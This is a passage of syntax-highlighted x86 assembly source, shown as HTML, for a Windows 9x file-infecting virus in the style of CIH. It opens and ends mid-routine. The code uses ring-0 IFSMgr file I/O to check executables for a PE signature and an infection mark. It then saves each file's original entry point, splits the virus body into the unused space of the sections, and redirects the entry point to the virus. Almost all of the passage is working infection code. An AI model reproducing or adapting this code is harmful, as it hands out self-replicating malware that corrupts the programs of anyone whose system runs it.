            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Get 'PE\0' Signature    *</span><span class="sc0">
</span><span class="sc1">; * of ImageFileHeader, and *</span><span class="sc0">
</span><span class="sc1">; * Infected Mark.          *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Is PE !?                *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Is the File             *</span><span class="sc0">
</span><span class="sc1">; * Already Infected !?     *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc1">; cmp [esi], '\0PE\0'</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00455000h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * The File is                   ^o^ *</span><span class="sc0">
</span><span class="sc1">; * PE(Portable Executable) indeed.   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * The File isn't also Infected.     *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Start to Infect the File          *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Registers Use Status Now :        *</span><span class="sc0">
</span><span class="sc1">; *                                   *</span><span class="sc0">
</span><span class="sc1">; * EAX = 04h                         *</span><span class="sc0">
</span><span class="sc1">; * EBX = File Handle                 *</span><span class="sc0">
</span><span class="sc1">; * ECX = 04h                         *</span><span class="sc0">
</span><span class="sc1">; * EDX = 'PE\0\0' Signature of       *</span><span class="sc0">
</span><span class="sc1">; *       ImageFileHeader Pointer's   *</span><span class="sc0">
</span><span class="sc1">; *   Former Byte.                *</span><span class="sc0">
</span><span class="sc1">; * ESI = DataBuffer Address ==&gt; @8   *</span><span class="sc0">
</span><span class="sc1">; * EDI = IFSMgr_Ring0_FileIO Address *</span><span class="sc0">
</span><span class="sc1">; * EBP = D600h ==&gt; Read Data in File *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Stack Dump :                      *</span><span class="sc0">
</span><span class="sc1">; *                                   *</span><span class="sc0">
</span><span class="sc1">; * ESP =&gt; -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |       EFLAG(CF=0)     |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        | FileNameBufferPointer |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          EDI          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          ESI          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          EBP          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          ESP          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          EBX          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          EDX          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          ECX          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |          EAX          |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *        |     Return Address    |  *</span><span class="sc0">
</span><span class="sc1">; *        -------------------------  *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Save File Handle</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Set VirusCodeSectionTableEndMark</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set the           *</span><span class="sc0">
</span><span class="sc1">; * Virus' Infected Mark    *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Pointer of File</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Save ESP Register       *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set the           *</span><span class="sc0">
</span><span class="sc1">; * NewAddressOfEntryPoint  *</span><span class="sc0">
</span><span class="sc1">; * ( Only First Set Size ) *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Read              *</span><span class="sc0">
</span><span class="sc1">; * Image Header in File    *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeOfImageHeaderToRead</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc1">; Move EDX to NumberOfSections</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set the           *</span><span class="sc0">
</span><span class="sc1">; * NewAddressOfEntryPoint  *</span><span class="sc0">
</span><span class="sc1">; * ( Set Pointer of File,  *</span><span class="sc0">
</span><span class="sc1">; *   Address of Buffer   ) *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Pointer of File</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NewAddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Move EDX to the Start   *</span><span class="sc0">
</span><span class="sc1">; * of SectionTable in File *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Get               *</span><span class="sc0">
</span><span class="sc1">; * Total Size of Sections  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeOfScetionTable</span><span class="sc0">
 
            </span><span class="sc1">; I Assume NumberOfSections &lt;= 0ffh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NumberOfSections</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set Section Table *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc1">; Move ESI to the Start of SectionTable</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">StartOfSectionTable</span><span class="sc4">-</span><span class="sc5">@8</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Pointer of File</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * The Code Size of Merge  *</span><span class="sc0">
</span><span class="sc1">; * Virus Code Section and  *</span><span class="sc0">
</span><span class="sc1">; * Total Size of Virus     *</span><span class="sc0">
</span><span class="sc1">; * Code Section Table Must *</span><span class="sc0">
</span><span class="sc1">; * be Small or Equal the   *</span><span class="sc0">
</span><span class="sc1">; * Unused Space Size of    *</span><span class="sc0">
</span><span class="sc1">; * Following Section Table *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Save NumberOfSections+1</span><span class="sc0">
 
            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Save TotalSizeOfVirusCodeSectionTable</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SizeOfHeaders</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0"> </span><span class="sc5">CodeSizeOfMergeVirusCodeSection</span><span class="sc0">
            </span><span class="sc6">jl</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OnlySetInfectedMark</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Save Original           *</span><span class="sc0">
</span><span class="sc1">; * Address of Entry Point  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc1">; Save My Virus First Section Code</span><span class="sc0">
            </span><span class="sc1">; Size of Following Section Table...</span><span class="sc0">
            </span><span class="sc1">; ( Not Include the Size of Virus Code Section Table )</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; ECX = Size of Section Table</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">AddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ImageBase</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OriginalAddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Read All Section Tables *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set Total Virus   *</span><span class="sc0">
</span><span class="sc1">; * Code Section Table      *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc1">; EBX = My Virus First Section Code</span><span class="sc0">
            </span><span class="sc1">;   Size of Following Section Table</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; EDI = TotalSizeOfVirusCodeSectionTable</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; ECX = NumberOfSections+1</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Size</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; Pointer of File</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 
            </span><span class="sc1">; Modify the Bug that WinZip Self-Extractor Occurs Error...</span><span class="sc0">
            </span><span class="sc1">; So When Open WinZip Self-Extractor, My Virus Don't Infect it...</span><span class="sc0">
            </span><span class="sc1">; The WinZip Self-Extractor Last Section Name is '_winzip_'</span><span class="sc0">
            </span><span class="sc1">; I Just Only Test Last Four Bytes ==&gt; 'zip_'</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">SizeOfScetionTable</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'_piz'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">OnlySetInfectedMark</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Set the First Virus     *</span><span class="sc0">
</span><span class="sc1">; * Code Section Size in    *</span><span class="sc0">
</span><span class="sc1">; * VirusCodeSectionTable   *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set My Virus      *</span><span class="sc0">
</span><span class="sc1">; * First Section Code      *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Pointer of File</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">MyVirusStart</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Modify the        *</span><span class="sc0">
</span><span class="sc1">; * AddressOfEntryPoint to  *</span><span class="sc0">
</span><span class="sc1">; * My Virus Entry Point    *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NewAddressOfEntryPoint</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Setup Initial Data      *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc5">SizeOfScetionTable</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StartToWriteCodeToSections</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Write Code to Sections  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">LoopOfWriteCodeToSections</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SizeOfScetionTable</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SizeOfRawData</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirtualSize</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">EndOfWriteCodeToSections</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Size</span><span class="sc0">
 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PointerToRawData</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirtualSize</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Pointer of File</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Address of Buffer</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirtualSize</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirtualAddress</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ImageBase</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirtualSize</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
            </span><span class="sc1">; Section contains initialized data ==&gt; 00000040h</span><span class="sc0">
            </span><span class="sc1">; Section can be Read.              ==&gt; 40000000h</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">Characteristics</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40000040h</span><span class="sc0">
 
</span><span class="sc5">StartToWriteCodeToSections</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">SetVirusCodeSectionTableEndMark</span><span class="sc0">
 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Move Address of Buffer</span><span class="sc0">
 
</span><span class="sc5">EndOfWriteCodeToSections</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopOfWriteCodeToSections</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Only Set Infected Mark  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">OnlySetInfectedMark</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WriteVirusCodeToFile</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Set Virus Code          *</span><span class="sc0">
</span><span class="sc1">; * Section Table End Mark  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">SetVirusCodeSectionTableEndMark</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc1">; Adjust Size of Virus Section Code to Correct Value</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 
            </span><span class="sc1">; Set End Mark</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
